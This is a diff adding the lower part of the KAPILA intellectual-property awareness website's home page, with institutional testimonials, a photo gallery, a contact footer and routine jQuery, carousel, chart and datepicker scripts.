+                                        Click the link to be part of the conversation. - <span style="color:#ffbb3a;text-decoration: underline;">https://aicteindia.webex.com/aicteindia/j.php?MTID=m73784a74589da42a17ce42e4d86ca96c<span></a>
+                                </a> -->
+
+                            </marquee>
+                        </div>
+
+                    </div>
+                    <div class="col-md-12 col-lg-6">
+                        <h3 class="text-center blueLineHeading3">Feedback From Institutions</h3>
+                        <div class="link-outer">
+
+                            <section id="testim" class="testim">
+                                <!--         <div class="testim-cover"> -->
+                                <div class="wrap">
+
+                                    <span id="right-arrow" class="arrow right fa fa-chevron-right"></span>
+                                    <span id="left-arrow" class="arrow left fa fa-chevron-left "></span>
+                                    <ul id="testim-dots" class="dots" style="display:none;">
+                                        <li class="dot active"></li><!--
+                    -->
+                                        <li class="dot"></li><!--
+                    -->
+                                        <li class="dot"></li><!--
+                    -->
+                                        <li class="dot"></li><!--
+                    -->
+                                        <li class="dot"></li>
+                                        <li class="dot"></li>
+                                        <li class="dot"></li>
+                                        <li class="dot"></li>
+                                        <li class="dot"></li>
+                                        <li class="dot"></li>
+                                    </ul>
+                                    <div id="testim-content" class="cont">
+
+                                        <div class="active">
+                                            <p>Good Scheme for patent filers.</p>
+                                            <h2>Holy Cross College (Autonomous), Nagercoil</h2>
+                                        </div>
+
+                                        <div>
+                                            <p>Motivating program for researchers.</p>
+                                            <h2>Bapuji Institute of Engineering & Technology, Davangere</h2>
+                                        </div>
+
+                                        <div>
+                                            <p>The scheme is opens new dimesion of support in patent and IPR.</p>
+                                            <h2>Tula's Institute</h2>
+                                        </div>
+
+                                        <div>
+                                            <p>Its really a wonderful scheme reimbusing the govt fees which certainly motivating the applicants to file applications for patent and making request for the examination of such filed applications.</p>
+                                            <h2>IIS deemed to be University</h2></div>
+
+                                        <div>
+                                            <p>Its a great initiative taken by the Ministry of Innovation Cell to create awareness about IPR and patent.</p>
+                                            <h2>KIIT UNIVERSITY</h2>
+                                        </div>
+
+                                        <div>
+                                            <p>This scheme is really handholding scheme for reseachers,product developers etc.</p>
+                                            <h2>Haldia Institute of Technology</h2>
+                                        </div>
+
+                                        <div>
+                                            <p>It is much needed scheme for recording the innovations.</p>
+                                            <h2>National Institute of Food Technology, Entrepreneurship and Management (NIFTEM) - Thanjavur</h2></div>
+
+                                        <div>
+                                            <p>Excellent Scheme for students and faculty members.</p><h2>Hindusthan College of Engineering and Technology</h2>
+                                        </div>
+
+                                        <div>
+                                            <p>Very Excellent Scheme for Innovators.</p>
+                                            <h2>Pimpri Chinchwad College of Engineering</h2>
+                                        </div>
+
+                                        <div>
+                                            <p>Kapila is a very good initiative by MIC. It has helped in improving the IP ecosystem & Awareness regarding IP filing, mechanism, and methodology involved in filing IP in India and globally among students and faculty.</p>
+                                            <h2>Jayawant Shikshan Prasarak Mandal's Rajarshi Shahu College of Engineering</h2>
+                                        </div>
+                                    </div>
+                                </div>
+                            </section>
+
+
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- End section -->
+        <!-- Notification Section Start-->
+        <!-- Feedback carousel -->
+        <!-- Feedback carousel end -->
+        <div class="container page-top mb-5">
+            <div class="row">
+                <div class="col-md-12 mb-5">
+                    <h2 class="font-bold kapilaIPRTitle blueLineHeading2 text-center">Photo Gallery</h2>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-3 col-md-4 col-xs-6 thumb">
+                    <a href="images/gallery/6.jpg" class="fancybox" rel="ligthbox">
+                        <img src="images/gallery/6.jpg" class="zoom img-fluid " alt="">
+                    </a>
+                </div>
+                <div class="col-lg-3 col-md-4 col-xs-6 thumb">
+                    <a href="images/gallery/2.jpg" class="fancybox" rel="ligthbox">
+                        <img src="images/gallery/2.jpg" class="zoom img-fluid " alt="">
+                    </a>
+                </div>
+                <div class="col-lg-3 col-md-4 col-xs-6 thumb">
+                    <a href="images/gallery/3.jpg" class="fancybox" rel="ligthbox">
+                        <img src="images/gallery/3.jpg" class="zoom img-fluid " alt="">
+                    </a>
+                </div>
+                <div class="col-lg-3 col-md-4 col-xs-6 thumb">
+                    <a href="images/gallery/4.jpg" class="fancybox" rel="ligthbox">
+                        <img src="images/gallery/4.jpg" class="zoom img-fluid " alt="">
+                    </a>
+                </div>
+            </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var flg = 0;
+                $('#second-navi').click(function() {
+                    console.log('function');
+                    if (flg != 0) {
+                        $('#header141').addClass('show');
+                    } else {
+                        $('#header141').removeClass('show');
+                    }
+
+                })
+            });
+        </script>
+  
+<!-- ============================================================== -->
+  <!-- footer 3  -->
+  <!-- ============================================================== -->
+  <div class="footer3 bg-dark font-14">
+
+      <div class="f3-middle container">
+          <!-- Row  -->
+          <div class="row">
+              <!-- cOLUMN -->
+              <div class="col-xs-12 col-md-6 col-lg-4 m-b-30">
+                  <h6 class="font-medium text-white">Quick Links</h6>
+                  <ul class="general-listing">
+                      <li><a href="https://mic.gov.in" target="_blank"><i class="fa fa-caret-right"></i>MoE's Innovation Cell</a></li>
+                      <li><a href="https://aicte-india.org" target="_blank"><i class="fa fa-caret-right"></i>AICTE</a></li>
+                      <li><a href="https://sic.mic.gov.in/" target="_blank"><i class="fa fa-caret-right"></i>SIC</a></li>
+                      <li><a href="https://sia.mic.gov.in/" target="_blank"><i class="fa fa-caret-right"></i>SIA</a></li>
+                  </ul>
+              </div>
+              <!-- cOLUMN -->
+              <!-- cOLUMN -->
+              <!-- <div class="col-lg-3 col-md-6 m-b-30">
+                            <h6 class="font-medium text-white">Recent Updates</h6>
+                            <div class="d-flex no-block align-items-center m-t-20">
+                                <div class="thumb m-r-20"><img src="images/footer/1.jpg" alt="wrapkit" /></div>
+                                <div class="btext"><a href="javascript:void(0);" class="link">KAPILA Launched </a></div>
+                            </div>
+                            
+                        </div> -->
+              <!-- cOLUMN -->
+              <!-- cOLUMN -->
+              <div class="col-xs-12 col-md-6 col-lg-4 m-b-30">
+                  <!-- <h6 class="font-medium text-white">Social Media</h6> -->
+                  <h6 class="font-medium text-white">Terms and Conditions</h6>
+                  <ul class="general-listing">
+                      <!--  <li><a href="https://mic.gov.in" target="_blank"><i class="fa fa-caret-right"></i>MoE's Innovation Cell</a></li>
+                                <li><a href="https://aicte-india.org" target="_blank"><i class="fa fa-caret-right"></i>AICTE</a></li>
+                                <li><a href="https://ariia.gov.in" target="_blank"><i class="fa fa-caret-right"></i>ARIIA</a></li>
+                                <li><a href="https://kapila.mic.gov.in" target="_blank"><i class="fa fa-caret-right"></i>KAPILA</a></li> -->
+                      <li><a href="formation-of-committee.php" target="_blank"><i class="fa fa-caret-right"></i>Formation of Committee and Submission of Unique Innovation </a></li>
+                      <li><a href="committee-document-format.php" target="_blank"><i class="fa fa-caret-right"></i>Guideline for the Committee Document Format</a></li>
+                      <li><a href="expert-committee.php" target="_blank"><i class="fa fa-caret-right"></i>Expert Committee </a></li>
+                      <li><a href="report-submissions.php" target="_blank"><i class="fa fa-caret-right"></i>Report and Supporting Document Submission </a></li>
+                      <li><a href="monitoring-verifications.php" target="_blank"><i class="fa fa-caret-right"></i>Monitoring </a></li>
+                      <li><a href="KAPILA FAQ.pdf" target="_blank"><i class="fa fa-caret-right"></i>FAQ </a></li>
+                  </ul>
+              </div>
+              <!-- cOLUMN -->
+              <!-- cOLUMN -->
+              <div class="col-xs-12 col-md-6 col-lg-4-b-30">
+                  <h6 class="font-medium text-white">CONTACT</h6>
+                  <div class="d-flex no-block m-b-10 m-t-20">
+                      <div class="display-7 m-r-20 align-self-top"><i class="fa fa-location-arrow"></i></div>
+                      <div class="info">
+                          <p>Room no 316,<br>
+                              AICTE Head Quarters, <br>
+                              Nelson Mandela Marg, VasantKunj, New Delhi-110070
+                          </p>
+                      </div>
+                  </div>
+                  <div class="d-flex no-block m-b-10">
+                      <div class="display-7 m-r-20 align-self-top"><i class="fa fa-phone"></i></div>
+                      <div class="info">
+                          <a href="Tel:011-29581337, 29581326, 9266744473" class="link db  m-t-5">011-29581337, 29581332, 9266744473</a>
+                      </div>
+                  </div>
+                  <div class="d-flex no-block m-b-30">
+                      <div class="display-7 m-r-20 align-self-top"><i class="fa fa-envelope-o"></i></div><div class="info">
+                          <a href="mailto:kapila@aicte-india.org" class="link db  m-t-5">kapila@aicte-india.org</a></div>
+                  </div>
+              </div>
+              <!-- cOLUMN -->
+          </div><!-- Row  -->
+      </div>
+      <div class="f3-bottom-bar">
+          <div class="container">
+              <div class="d-flex">
+                  <span class="m-t-10 m-b-10 footerCopyright">Kalam Program for IP Literacy & Awareness- Designed & Developed by MIC</span>
+                  <!-- <div class="ml-auto m-t-10 m-b-10">
+                                <a href="#" class="link"><i class="fa fa-facebook"></i></a>
+                                <a href="#" class="link"><i class="fa fa-twitter"></i></a>
+                                <a href="#" class="link"><i class="fa fa-linkedin"></i></a>
+                                <a href="#" class="link"><i class="fa fa-pinterest"></i></a>
+                                <a href="#" class="link"><i class="fa fa-instagram"></i></a>
+                            </div> -->
+              </div>
+          </div>
+      </div>
+  </div>
+  <!-- ============================================================== -->
+  <!-- End footer 3  -->
+  <!-- ============================================================== -->
+  <!-- ============================================================== -->
+  <!-- Back to top -->
+  <!-- ============================================================== -->
+  <a class="bt-top btn btn-circle btn-lg btn-info" href="#top"><i class="fa fa-level-up" aria-hidden="true"></i></a>
+  </div>
+  <!-- ============================================================== -->
+  <!-- End Page wrapper  -->
+  <!-- ============================================================== -->
+  </div>
+  <!-- ============================================================== -->
+  <!-- End Wrapper -->
+  <!-- ============================================================== -->
+  <!-- ============================================================== -->
+  <!-- All Jquery -->
+  <!-- ============================================================== -->
+  <script src="assets/node_modules/jquery/dist/jquery.min.js"></script>
+  <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script> -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.2/jquery.min.js" integrity="sha512-eqClqe36bqXg9ABERfLUfLsDuC0J9sgC2ECZmEFsw5snXC7ANYMeOijlBAcRlhctHbvHx9ZERfjBteM6U27qYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="js/slick.js"></script>
+  <!-- Bootstrap popper Core JavaScript -->
+  <script src="assets/node_modules/popper/dist/popper.min.js"></script>
+  <script src="assets/node_modules/bootstrap/js/bootstrap.min.js"></script>
+  <!-- This is for the animation -->
+  <script src="assets/node_modules/aos/dist/aos.js"></script>
+  <!--Custom JavaScript -->
+  <script src="js/custom.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/js/lightbox.min.js"></script>
+  <!-- ============================================================== -->
+  <!-- This page plugins -->
+  <!-- ============================================================== -->
+  <script src="assets/node_modules/jquery.touchSwipe.min.js"></script>
+  <script src="assets/node_modules/bootstrap-touch-slider/bootstrap-touch-slider.js"></script>
+  <script src="assets/node_modules/magnific-popup/dist/jquery.magnific-popup.min.js"></script>
+  <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
+  <script src="js/ind-map.js"></script>
+
+
+
+  <script>
+      $('.center').slick({
+          centerMode: true,
+          centerPadding: '60px',
+          slidesToShow: 3,
+          autoplay: true,
+          autoplaySpeed: 2000,
+          responsive: [{
+                  breakpoint: 768,
+                  settings: {
+                      arrows: false,
+                      centerMode: true,
+                      centerPadding: '40px',
+                      slidesToShow: 3
+                  }
+              },
+              {
+                  breakpoint: 480,
+                  settings: {
+                      arrows: false,
+                      centerMode: true,
+                      centerPadding: '40px',
+                      slidesToShow: 1
+                  }
+              }
+          ]
+      });
+  </script>
+
+
+  <script>
+      $('#slider2').bsTouchSlider();
+      $('.popup-gallery').magnificPopup({
+          delegate: 'a',
+          type: 'image',
+          tLoading: 'Loading image #%curr%...',
+          mainClass: 'mfp-img-mobile',
+          gallery: {
+              enabled: true,
+              navigateByImgClick: true,
+              preload: [0, 1] // Will preload 0 - before current, and 1 after the current image
+          },
+          image: {
+              tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
+              titleSrc: function(item) {
+                  return item.el.attr('title') + '<small>by Jon Doe</small>';
+              }
+          }
+      });
+  </script>
+  <script>
+      // Scroll Counting Script
+      var a = 0;
+      $(window).scroll(function() {
+          var oTop = $('#counter').offset().top - window.innerHeight;
+          if (a == 0 && $(window).scrollTop() > oTop) {
+              $('.counter-value').each(function() {
+                  var $this = $(this),
+                      countTo = $this.attr('data-count');
+                  $({
+                      countNum: $this.text()
+                  }).animate({
+                          countNum: countTo
+                      },
+
+                      {
+
+                          duration: 4000,
+                          easing: 'swing',
+                          step: function() {
+                              $this.text(Math.floor(this.countNum));
+                          },
+                          complete: function() {
+                              $this.text(this.countNum);
+                          }
+
+                      });
+              });
+              a = 1;
+          }
+
+      });
+  </script>
+  <script type="text/javascript">// Load google charts
+      google.charts.load('current', {
+          'packages': ['corechart']
+      });
+      google.charts.setOnLoadCallback(drawChart);
+
+      // Draw the chart and set the chart values
+      function drawChart() {
+          var data = google.visualization.arrayToDataTable([
+              ['Task', 'Hours per Day'],
+              ['Rural', 5],
+              ['Urban', 5]
+          ]);
+
+          // Optional; add a title and set the width and height of the chart
+          var options = {'title': '',
+              'width': '100%',
+              'height': '500',
+              is3D: true,
+              slices: {
+                  0: {
+                      color: '#dc3912'
+                  },
+                  1: {
+                      color: '#ff9901'
+                  },
+                  2: {
+                      color: 'red'
+                  },
+                  3: {
+                      color: 'grey'
+                  }
+              }
+          };
+
+          // Display the chart inside the <div> element with id="piechart"
+          var chart = new google.visualization.PieChart(document.getElementById('piechart'));
+          chart.draw(data, options);
+      }
+  </script>
+
+
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.7.1/js/bootstrap-datepicker.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
+  <script>
+      $(document).ready(function() {
+          $(".fancybox").fancybox({
+              openEffect: "none",closeEffect: "none"
+          });
+
+          $(".zoom").hover(function() {
+
+              $(this).addClass('transition');
+          }, function() {
+
+              $(this).removeClass('transition');
+          });
+      });
+  </script>
+  <script>
+      $('#datepicker').datepicker({
+          weekStart: 1,
+          // daysOfWeekHighlighted: "0",
+          autoclose: true,
+          todayHighlight: true,
+      });
+      $('#datepicker-1').datepicker({
+          weekStart: 1,
+          // daysOfWeekHighlighted: "0",
+          autoclose: true,
+          todayHighlight: true,
+      });
+
+      // $('#datepicker').datepicker("setDate", new Date());
+  </script>
+
+
+
+  <script>
+      'use strict'
+      var testim = document.getElementById("testim"),
+          testimDots = Array.prototype.slice.call(document.getElementById("testim-dots").children),
+          testimContent = Array.prototype.slice.call(document.getElementById("testim-content").children),
+          testimLeftArrow = document.getElementById("left-arrow"),
+          testimRightArrow = document.getElementById("right-arrow"),
+          testimSpeed = 4500,
+          currentSlide = 0,
+          currentActive = 0,
+          testimTimer,
+          touchStartPos,
+          touchEndPos,
+          touchPosDiff,
+          ignoreTouch = 30;;
+
+      window.onload = function() {
+
+          // Testim Script
+          function playSlide(slide) {
+              for (var k = 0; k < testimDots.length; k++) {
+                  testimContent[k].classList.remove("active");
+                  testimContent[k].classList.remove("inactive");
+                  testimDots[k].classList.remove("active");
+              }
+
+              if (slide < 0) {
+                  slide = currentSlide = testimContent.length - 1;
+              }
+
+              if (slide > testimContent.length - 1) {
+                  slide = currentSlide = 0;
+              }
+
+              if (currentActive != currentSlide) {
+                  testimContent[currentActive].classList.add("inactive");
+              }
+              testimContent[slide].classList.add("active");
+              testimDots[slide].classList.add("active");
+
+              currentActive = currentSlide;
+
+              clearTimeout(testimTimer);
+              testimTimer = setTimeout(function() {
+                  playSlide(currentSlide += 1);
+              }, testimSpeed)
+          }
+
+          testimLeftArrow.addEventListener("click", function() {
+              playSlide(currentSlide -= 1);
+          })
+
+          testimRightArrow.addEventListener("click", function() {
+              playSlide(currentSlide += 1);
+          })
+
+          for (var l = 0; l < testimDots.length; l++) {
+              testimDots[l].addEventListener("click", function() {
+                  playSlide(currentSlide = testimDots.indexOf(this));
+              })
+          }
+
+          playSlide(currentSlide);
+
+          // keyboard shortcuts
+          document.addEventListener("keyup", function(e) {
+              switch (e.keyCode) {
+                  case 37:
+                      testimLeftArrow.click();
+                      break;
+
+                  case 39:
+                      testimRightArrow.click();
+                      break;
+
+                  case 39:
+                      testimRightArrow.click();
+                      break;
+
+                  default:
+                      break;
+              }
+          })
+
+          testim.addEventListener("touchstart", function(e) {
+              touchStartPos = e.changedTouches[0].clientX;
+          })
+
+          testim.addEventListener("touchend", function(e) {
+              touchEndPos = e.changedTouches[0].clientX;
+
+              touchPosDiff = touchStartPos - touchEndPos;
+
+              console.log(touchPosDiff);
+              console.log(touchStartPos);
+              console.log(touchEndPos);
+
+
+              if (touchPosDiff > 0 + ignoreTouch) {
+                  testimLeftArrow.click();
+              } else if (touchPosDiff < 0 - ignoreTouch) {
+                  testimRightArrow.click();
+              } else {
+                  return;
+              }
+
+          })
+      }
+  </script>
+
+
+
+  </body>
+
+  </html>
